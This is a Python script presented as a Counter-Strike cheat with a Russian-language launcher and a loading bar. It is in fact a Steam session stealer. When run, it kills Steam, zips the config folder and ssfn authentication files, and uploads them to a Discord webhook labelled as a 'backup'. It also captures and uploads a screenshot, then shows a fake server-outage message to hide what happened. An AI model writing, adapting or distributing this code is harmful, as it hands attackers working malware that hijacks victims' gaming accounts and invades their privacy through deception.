import os
import zipfile
import time
import sys
from discord_webhook import DiscordWebhook, DiscordEmbed
from PIL import ImageGrab
from zipfile import ZipFile

# ссылка вашего вебхука
hook = "YOUR DISCORD WEBHOOK"
user = os.path.expanduser("~")

def kill_process(process_name):
    result = os.system(f"taskkill /F /IM {process_name}")
    if result == 0:
        print(f"{process_name} был закрыт ради обхода VAC.")
    else:
        print(f"Пожалуйста, откройте {process_name}.")

def copy_directory(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        src_path = os.path.join(src, item)
        dst_path = os.path.join(dst, item)
        if os.path.isdir(src_path):
            copy_directory(src_path, dst_path)
        else:
            with open(src_path, 'rb') as f_read, open(dst_path, 'wb') as f_write:
                f_write.write(f_read.read())

def remove_directory(dir_path):
    for item in os.listdir(dir_path):
        path = os.path.join(dir_path, item)
        if os.path.isdir(path):
            remove_directory(path)
        else:
            os.remove(path)
    os.rmdir(dir_path)

def steam_st():
    kill_process("Steam.exe")
    steam_path = os.environ.get("PROGRAMFILES(X86)", "") + "\\Steam"
    if os.path.exists(steam_path):
        ssfn_files = [os.path.join(steam_path, file) for file in os.listdir(steam_path) if file.startswith("ssfn")]
        steam_config_path = os.path.join(steam_path, "config")

        zip_path = os.path.join(os.environ['TEMP'], "steam_session.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zp:
            if os.path.exists(steam_config_path):
                for root, dirs, files in os.walk(steam_config_path):
                    for file in files:
                        zp.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), steam_path))
                for ssfn_file in ssfn_files:
                    zp.write(ssfn_file, os.path.basename(ssfn_file))

        webhook = DiscordWebhook(url=hook)
        embed = DiscordEmbed(title="Steam Data Backup", description="Latest backup of the Steam session data.", color=242424)
        embed.set_footer(text="Backup completed successfully")
        webhook.add_embed(embed)
        webhook.execute()

        webhook = DiscordWebhook(url=hook)
        with open(zip_path, 'rb') as f:
            webhook.add_file(file=f.read(), filename='steam_session.zip')
        webhook.execute()

        os.remove(zip_path)

def screen():
    sss = ImageGrab.grab()
    temp_path = os.path.join(user, "AppData\\Local\\Temp\\ss.png")
    sss.save(temp_path)

    webhook = DiscordWebhook(url=hook)
    embed = DiscordEmbed(title="Screenshot", description="Latest screenshot capture.", color=242424)
    webhook.add_embed(embed)
    webhook.execute()

    webhook = DiscordWebhook(url=hook)
    with open(temp_path, "rb") as f:
        webhook.add_file(file=f.read(), filename='ss.png')
    webhook.execute()

    try:
        os.remove(temp_path)
    except Exception as e:
        print(f"Error removing file: {e}")

def loading_bar():
    toolbar_width = 40
    sys.stdout.write("Загрузка: [%s]" % (" " * toolbar_width))
    sys.stdout.flush()
    sys.stdout.write("\b" * (toolbar_width+1)) 

    for i in range(toolbar_width):
        time.sleep(0.1) 
        sys.stdout.write("-")
        sys.stdout.flush()

    sys.stdout.write("]\n")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("\033[94m")  
    print(r"""
 _________   _____________  ___      .__         .__  __   
\_   ___ \ /   _____/\   \/  /_____ |  |   ____ |__|/  |_ 
/    \  \/ \_____  \  \     /\____ \|  |  /  _ \|  \   __\
\     \____/        \ /     \|  |_> >  |_(  <_> )  ||  |  
 \______  /_______  //___/\  \   __/|____/\____/|__||__|  
        \/        \/       \_/__|                         
    """)
    print("\033[0m")  

    consent = input("Вы хотите запустить чит? (y/n): ").strip().lower()
    if consent == 'y':
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\033[94m")  
        loading_bar()
        print("\033[0m")  
        steam_st()
        screen()
        print("\033[91mСервера на данный момент в аварийном состоянии, попробуйте позже\033[0m")
    else:
        print("Программа не была запущена.")

if __name__ == "__main__":
    main()
